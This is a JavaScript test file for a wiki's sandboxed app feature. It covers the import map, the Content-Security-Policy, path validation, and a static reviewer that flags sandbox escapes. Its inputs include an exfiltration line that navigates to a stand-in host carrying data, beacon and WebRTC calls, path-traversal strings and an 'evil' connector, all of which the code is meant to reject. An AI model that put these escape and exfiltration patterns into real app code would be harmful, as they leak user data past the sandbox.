import test from 'node:test';import assert from 'node:assert/strict';import ts from 'typescript';import {readFileSync} from 'node:fs';import {pathToFileURL} from 'node:url';
const zod=pathToFileURL(process.cwd()+'/node_modules/zod/index.js').href;
const load=(source)=>import('data:text/javascript;base64,'+Buffer.from(ts.transpile(source,{module:ts.ModuleKind.ESNext,target:ts.ScriptTarget.ES2022})).toString('base64'));
const local=(file)=>readFileSync(file,'utf8').replace("from 'zod'",`from '${zod}'`).replace(/^import .*'@\/.*;$/gm,'');
process.env.APP_URL='https://wiki.example';
const sandbox=await load(local('app/components-registry/sandbox-contracts.ts'));
const libs=await load(local('app/app-libs/proxy.ts'));
const tiles=await load(local('app/app-libs/tiles.ts'));
globalThis.reviewDeps={listedLibrary:libs.listedLibrary};
const review=await load('const {listedLibrary}=globalThis.reviewDeps;\n'+local('app/page-programs/code-review.ts'));
const app=(extra={})=>sandbox.sandboxSchema.parse({kind:'sandbox-app',html:'<div id="map"></div>',css:'',javascript:'import L from "leaflet";\nimport {zones} from "./lib/zones.js";\nL.map("map");',files:[{path:'lib/zones.js',content:'import data from "../data/z.json" with {type:"json"};\nexport const zones=data;'},{path:'data/z.json',content:'[1,2]'},{path:'notes.txt',content:'hello </script>'}],libraries:{leaflet:'1.9.4'},height:600,...extra});

test('multi-file apps get an import map onto this site\u2019s library proxy and their own modules',()=>{
 const html=sandbox.sandboxDocument(app());
 const map=JSON.parse(html.match(/<script type="importmap" nonce="\w+">(.*?)<\/script>/)[1]);
 assert.equal(map.imports.leaflet,'https://wiki.example/api/app-libs/npm/leaflet@1.9.4/+esm');
 assert.equal(map.imports['leaflet/'],'https://wiki.example/api/app-libs/npm/leaflet@1.9.4/');
 assert.match(map.imports['app/lib/zones.js'],/^data:text\/javascript;base64,/);
 assert.match(Buffer.from(map.imports['app/lib/zones.js'].split(',')[1],'base64').toString(),/from "app\/data\/z\.json"/);
 assert.match(html,/<script type="module" nonce="\w+">import L from "leaflet";\nimport \{zones\} from "app\/lib\/zones\.js";/);
 assert.match(html,/window\.appFiles=\{"data\/z\.json":"\[1,2\]","notes\.txt":"hello \\u003c\/script>"\}/);
 assert.match(html,/<base href="https:\/\/wiki\.example\/">/);
 assert.match(html,/default-src 'none'/);assert.match(html,/form-action 'none'/);
 // Only this site (plus the existing Google Maps embed) appears in the policy.
 const policy=html.match(/Content-Security-Policy" content="([^"]+)"/)[1];
 for(const host of policy.match(/https:\/\/[^/ ;]+/g))assert.ok(['https://wiki.example','https://maps.google.com','https://www.google.com'].includes(host),host);
 assert.match(html,/RTCPeerConnection/);
});
test('apps without modules keep running as classic scripts; size and library rules are enforced',()=>{
 const html=sandbox.sandboxDocument(sandbox.sandboxSchema.parse({kind:'sandbox-app',html:'<p></p>',css:'',javascript:'function go(){}',height:400}));
 assert.ok(!html.includes('type="module"'));assert.ok(!html.includes('importmap'));
 assert.throws(()=>app({libraries:{leaflet:'latest'}}));
 assert.throws(()=>app({files:[{path:'../x.js',content:''}]}));
 assert.throws(()=>app({files:[{path:'a.js',content:'x'.repeat(400000)},{path:'b.js',content:'x'.repeat(400000)},{path:'c.js',content:'x'.repeat(400000)},{path:'d.js',content:'x'.repeat(400000)}]}));
});
test('the static review flags ways out of the sandbox and passes ordinary code',()=>{
 assert.deepEqual(review.staticReview(app()),[]);
 const bad=(javascript,html='<p></p>')=>review.staticReview({...app(),javascript,html}).map(i=>i.problem).join(' ');
 assert.match(bad('location.href="https://x.example/?d="+data'),/navigate/);
 assert.match(bad('window.location=url'),/navigate/);
 assert.match(bad('const pc=new RTCPeerConnection()'),/WebRTC/);
 assert.match(bad('navigator.sendBeacon(u,d)'),/Beacons/);
 assert.match(bad('','<script src="https://cdn.example/x.js"></script>'),/libraries field/);
 assert.match(bad('','<meta http-equiv="refresh" content="0;url=https://x">'),/Meta refresh/);
 assert.match(review.staticReview({...app(),libraries:{evilpkg:'1.0.0'}}).map(i=>i.problem).join(' '),/not an available library/);
 assert.deepEqual(review.staticReview({...app(),javascript:'item.location={lat:1};const location=2;if(location.href==="a"){}'}),[]);
});
test('module code is syntax-checked with its imports and exports',async()=>{
 await review.checkFrontendSyntax(app());
 await assert.rejects(review.checkFrontendSyntax({...app(),files:[{path:'lib/zones.js',content:'export const = ;'}]}),/syntax error in lib\/zones\.js/);
 await assert.rejects(review.checkFrontendSyntax({...app(),files:[{path:'data/z.json',content:'{bad'}]}),/not valid JSON/);
});
test('the library proxy serves listed packages and rewrites their own imports back to it',()=>{
 assert.deepEqual(libs.parseLibraryPath('react-dom@18.3.1/+esm'),{name:'react-dom',version:'18.3.1',rest:'/+esm'});
 assert.deepEqual(libs.parseLibraryPath('@turf/turf@7.1.0/dist/turf.min.js'),{name:'@turf/turf',version:'7.1.0',rest:'/dist/turf.min.js'});
 assert.equal(libs.parseLibraryPath('react@latest/+esm'),null);assert.equal(libs.parseLibraryPath('react@18.3.1/../x'),null);
 assert.ok(libs.listedLibrary('leaflet')&&libs.listedLibrary('d3-scale')&&libs.listedLibrary('@turf/area'));assert.ok(!libs.listedLibrary('totally-unknown-pkg'));
 const r=libs.rewriteLibrary('import a from"/npm/scheduler@0.23.2/+esm";export*from"/npm/@scope/x@1.0.0/+esm";\n//# sourceMappingURL=/sm/abc.map');
 assert.equal(r.text.trim(),'import a from"/api/app-libs/npm/scheduler@0.23.2/+esm";export*from"/api/app-libs/npm/@scope/x@1.0.0/+esm";');
 assert.deepEqual(r.found,['scheduler@0.23.2','@scope/x@1.0.0']);
});
test('tile requests are limited to known providers and valid coordinates',async()=>{
 assert.equal(await tiles.tileFile(['evil','1','0','0']),null);
 assert.equal(await tiles.tileFile(['osm','2','4','0']),null);
 assert.equal(await tiles.tileFile(['osm','20','0','0']),null);
 assert.equal(await tiles.tileFile(['osm','1','0','abc']),null);
 assert.equal(tiles.tileProviders.osm.template,'/api/app-tiles/osm/{z}/{x}/{y}');
});
test('app code may use platform tools but not ones that reach an address it chooses',async()=>{
 globalThis.policyDeps={connections:async()=>[{id:'c1',kind:'mcp',url:'https://evil.example/mcp'},{id:'gh',kind:'mcp',url:'https://api.githubcopilot.com/mcp/'},{id:'arcgis',kind:'api',url:'api:arcgis'}],connectorCatalog:[{id:'github',url:'https://api.githubcopilot.com/mcp/'}]};
 const policy=await load('const {connections,connectorCatalog}=globalThis.policyDeps;\n'+local('app/page-programs/app-tool-policy.ts'));
 await policy.checkAppTool('u','list_page_files',{});
 await policy.checkAppTool('u','call_connector',{connectorId:'arcgis'});
 await policy.checkAppTool('u','call_connector',{connectorId:'gh'});
 await assert.rejects(policy.checkAppTool('u','read_web_page',{url:'https://x'}),/web address chosen by the app/);
 await assert.rejects(policy.checkAppTool('u','import_image',{}),/Apps cannot use import_image/);
 await assert.rejects(policy.checkAppTool('u','call_connector',{connectorId:'c1'}),/custom connectors/);
});
